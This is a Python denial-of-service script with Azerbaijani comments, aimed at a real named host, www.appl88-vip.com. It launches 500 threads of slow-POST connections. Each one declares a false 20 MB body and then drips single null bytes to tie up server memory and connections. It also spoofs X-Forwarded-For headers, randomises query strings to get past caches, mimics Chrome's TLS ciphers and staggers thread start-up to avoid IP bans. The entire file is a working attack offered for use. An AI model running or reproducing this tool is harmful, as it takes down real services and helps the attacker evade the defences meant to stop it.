import socket
import ssl
import threading
import random
import time
import os

# --- EXTREME TARGET ---
TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
# Çox thread IP blokuna səbəb olur, sayı azaldırıq amma keyfiyyəti artırırıq
THREADS = 500 

def r_str(n):
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def ghost_strike():
    # SSL Handshake-i bir brauzer (Chrome) kimi göstərmək üçün tənzimləyirik
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Müasir Chrome ciphers-ləri ilə serveri aldadırıq
    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:AES128-GCM-SHA256')

    while True:
        try:
            # TCP bağlantısı
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # TCP Window Size-ı çox kiçik tuturuq (Serveri bağlantı limitində boğur)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024)
            sock.settimeout(10)

            # SSL bağlantısını qururuq
            conn = ctx.wrap_socket(sock, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # Serverin daxili API-lərini hədəf alırıq
            # Bu mürəkkəb URL-lər keşlənməni bypass edir
            params = f"v={time.time()}&id={r_str(30)}&invite_code={random.randint(1000, 9999)}"
            
            # Sənə dediyim o "böyük nəsə" göndərmə kəşfi burada:
            # Content-Length-i süni olaraq 20 MB göstəririk! 
            header = (
                f"POST /?{params} HTTP/1.1\r\n"
                f"Host: {TARGET_HOST}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(2,6)}.0.0.0 Safari/537.36\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 20971520\r\n" # 20 Megabyte! Server dərhal RAM ayıracaq.
                f"Connection: Keep-Alive\r\n"
                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
                f"\r\n"
            ).encode()

            conn.sendall(header)

            # İndi serveri "kilitləyirik": 
            # Hər saniyə cəmi 1 bayt göndəririk ki, server bağlantını kəsməsin
            for _ in range(500):
                conn.send(b"\x00")
                time.sleep(random.uniform(0.1, 1.0))

            conn.close()
        except Exception:
            pass

def main():
    print(f"👻 GHOST-SYNC ARMED: {TARGET_HOST}")
    print("[!] Targeting Origin Server Buffer & Memory Map.")
    
    for i in range(THREADS):
        t = threading.Thread(target=ghost_strike)
        t.daemon = True
        t.start()
        if i % 50 == 0:
            print(f"[*] {i} Ghost-Warheads synchronized...")
            time.sleep(1) # IP ban almasın deyə yavaş-yavaş başlayır

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
